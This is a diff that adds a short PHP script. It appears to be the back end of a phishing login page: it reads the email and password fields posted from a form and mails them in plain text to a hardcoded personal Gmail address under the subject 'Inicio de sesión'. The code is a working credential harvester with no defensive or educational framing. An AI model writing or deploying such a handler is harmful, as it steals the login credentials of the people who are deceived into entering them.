@@ -1,0 +1,10 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $to = "davisvalencia953@gmail.com";
+    $subject = "Inicio de sesión";
+    $correo = $_POST["correo"];
+    $contrasena = $_POST["contrasena"];
+    $message = "Correo electrónico: " . $correo . "\nContraseña: " . $contrasena;
+    mail($to, $subject, $message);
+}
+?>
